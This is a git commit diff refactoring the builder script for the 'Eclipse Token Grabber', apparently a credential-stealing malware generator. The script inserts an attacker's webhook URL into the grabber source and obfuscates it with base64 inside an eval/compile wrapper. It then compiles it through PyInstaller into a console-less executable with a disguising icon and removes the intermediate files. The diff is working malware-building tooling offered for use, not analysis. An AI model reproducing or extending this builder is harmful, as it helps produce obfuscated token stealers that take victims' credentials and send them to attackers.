9453d4c10cd5a0464e97f30585d95847e3770fec
JMiki <themrjmiki@gmail.com>
2022-01-23 05:44:22 +0300

    refactor: rework build

--- builder.py
+++ builder.py
@@ -1,73 +1,24 @@
+from os import remove as delete_file, path
 from sys import platform
-import argparse
-import subprocess
-import base64
-import os
+from base64 import b64encode
+from argparse import ArgumentParser
+from subprocess import run, PIPE
 
 
-class Builder:
+TITLE = '''
+    ███████╗ ██████╗██╗     ██╗██████╗ ███████╗███████╗     ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗
+    ██╔════╝██╔════╝██║     ██║██╔══██╗██╔════╝██╔════╝    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
+    █████╗  ██║     ██║     ██║██████╔╝███████╗█████╗      ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
+    ██╔══╝  ██║     ██║     ██║██╔═══╝ ╚════██║██╔══╝      ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
+    ███████╗╚██████╗███████╗██║██║     ███████║███████╗    ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
+    ╚══════╝ ╚═════╝╚══════╝╚═╝╚═╝     ╚══════╝╚══════╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
+\n        Made By Dimitris Kalopisis & Yuliy Mitryashkin | Twitter: @DKalopisis & @JM1k1
+'''
 
-    def __init__(self, webhook, out_file, os):
-        self.webhook = webhook
-        self.out_file = out_file
-        self.os = os
-        self.path_to_pyinstaller = "/root/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe"
-
-    def build(self):
-        f = open("code/eclipse-grabber.py", 'r')
-        file = f.read()
-        f.close()
-        newfile = file.replace("{WEBHOOK}", str(self.webhook))
-        encoded = base64.b64encode(newfile.encode())
-        f = open(self.out_file+".py", 'w')
-        f.write("import base64\n")
-        f.write("import os\n")
-        f.write("from sys import platform\n")
-        f.write("from platform import node\n")
-        f.write("from getpass import getuser\n")
-        f.write("from re import findall\n")
-        f.write("from json import loads, dumps\n")
-        f.write("from base64 import b64decode\n")
-        f.write("from urllib.request import Request, urlopen\n")
-        f.write("import ssl\n")
-        f.write(f"eval(compile(base64.b64decode({encoded}).decode(), '<string>', 'exec'))")
-        f.close()
-
-        if self.os == "Linux":
-            self.packageLinux()
-        elif self.os == "Windows":
-            self.packageWindows()
-        elif self.os == "OSX":
-            self.packageOSX()
-        else:
-            print("\nOS not supported\n")
-        try:
-            os.remove(self.out_file+".py")
-            os.remove(self.out_file+".spec")
-        except FileNotFoundError:
-            pass
-
-    def packageLinux(self):
-        compile_command = ["wine", self.path_to_pyinstaller, self.out_file+".py", "--onefile", "--noconsole", "--icon=img/exe_file.ico"]
-        subprocess.call(compile_command)
-
-    def packageWindows(self):
-        compile_command = ["venv/Scripts/pyinstaller.exe", "--onefile", "--noconsole", "--icon=img/exe_file.ico", self.out_file+".py"]
-        subprocess.call(compile_command)
-
-    def packageOSX(self):
-        compile_command = ["pyinstaller", "--onefile", "--noconsole", "--icon=img/exe_file.ico", self.out_file+".py"]
-        subprocess.call(compile_command)
+ECLIPSE_GRABBER_PATH = path.join("code", "eclipse-grabber.py")
 
 
-def getArgs():
-    parser = argparse.ArgumentParser(description='Eclipse Token Grabber Generator')
-    parser.add_argument('-w', '--webhook', help='Add your webhook', default='')
-    parser.add_argument('-o', '--outfile', help='Name your Executable', default='')
-    return parser.parse_args()
-
-
-def checkOS():
+def check_os() -> str:
     if platform == "linux" or platform == "linux2":
         OS = "Linux"
     elif platform == "darwin":
@@ -79,30 +30,75 @@ def checkOS():
     return OS
 
 
-arguments = getArgs()
-if not arguments.webhook or not arguments.outfile or not arguments.webhook and not arguments.outfile:
-    print("\n[-] Please Make Sure You Have Provided A Webhook And An Output File Name")
+def build(webhook: str, out_file: str):
+    code_file = open(ECLIPSE_GRABBER_PATH, 'r')
+    code = code_file.read()
+    code_file.close()
 
-else:
-    webhook = arguments.webhook
-    out_file = arguments.outfile
-    OS = checkOS()
+    libs = code[0:code.find("WEBHOOK")]
+    content = code.replace("{WEBHOOK}", str(webhook))
+    encoded = b64encode(content.encode())
+    eval_code = f"eval(compile(b64decode({encoded}).decode(), '<string>', 'exec'))"
 
-    print('''
+    build_file = open(out_file + ".py", 'w')
+    build_file.write(libs)
+    build_file.write(eval_code)
+    build_file.close()
 
-    ███████╗ ██████╗██╗     ██╗██████╗ ███████╗███████╗     ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
-    ██╔════╝██╔════╝██║     ██║██╔══██╗██╔════╝██╔════╝    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
-    █████╗  ██║     ██║     ██║██████╔╝███████╗█████╗      ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
-    ██╔══╝  ██║     ██║     ██║██╔═══╝ ╚════██║██╔══╝      ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
-    ███████╗╚██████╗███████╗██║██║     ███████║███████╗    ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
-    ╚══════╝ ╚═════╝╚══════╝╚═╝╚═╝     ╚══════╝╚══════╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
-                                                                                                                    
-    Made By Dimitris Kalopisis & Yuliy Mitryashkin | Twitter: @DKalopisis & @JM1k1
-    ''')
+    if check_os() == "Linux":
+        compile_command = ["wine",
+                           "/root/.wine/drive_c/"
+                           + "users/root/Local Settings/"
+                           + "Application Data/Programs/"
+                           + "Python/Python38-32/Scripts/"
+                           + "pyinstaller.exe"]
+    elif check_os() == "Windows":
+        compile_command = ["venv/Scripts/pyinstaller.exe"]
+    elif check_os() == "OSX":
+        compile_command = ["pyinstaller"]
+    else:
+        exit("\n[-] OS not supported\n")
+
+    compile_command += [out_file + ".py",
+                        "--onefile",
+                        "--noconsole",
+                        f"--icon={path.join('img','exe_file.ico')}"]
 
     try:
-        print("\n[+] Generating Eclipse Token Grabber, please wait...")
-        Builder(webhook, out_file, OS).build()
-        print("\n\n[+] Succesfully Generated Eclipse Token Grabber\n\n[+] You can find it inside the dist directory")
-    except Exception as e:
-        print(f"\n[-] An ERROR has occurred:\n{e}")
+        command_result = run(compile_command, stdout=PIPE, stderr=PIPE)
+        result = str(command_result.stderr).replace("b\"", "").replace(r'\n', '\n').replace(r'\r', '\r')
+        if "completed successfully" not in result:
+            raise Exception(result.splitlines()[-2])
+    except Exception as error:
+        raise exit(f"\n[-] Build Error: {error}")
+
+    try:
+        delete_file(out_file+".py")
+        delete_file(out_file+".spec")
+    except (FileNotFoundError, PermissionError):
+        pass
+
+
+def getArgs():
+    parser = ArgumentParser(description='Eclipse Token Grabber')
+    parser.add_argument('-w', '--webhook',
+                        help='add your webhook url',
+                        default='',
+                        required=True)
+    parser.add_argument('-o', '--outfile',
+                        help='name your executable',
+                        default='',
+                        required=True)
+    return parser.parse_args()
+
+
+def main(args):
+    print(TITLE)
+    print("\n[+] Generating Eclipse Token Grabber, please wait...")
+    build(args.webhook, args.outfile)
+    print("\n\n[+] Succesfully Builded Eclipse Token Grabber",
+          "\n\n[+] You can find it inside the dist directory")
+
+
+if __name__ == "__main__":
+    main(getArgs())
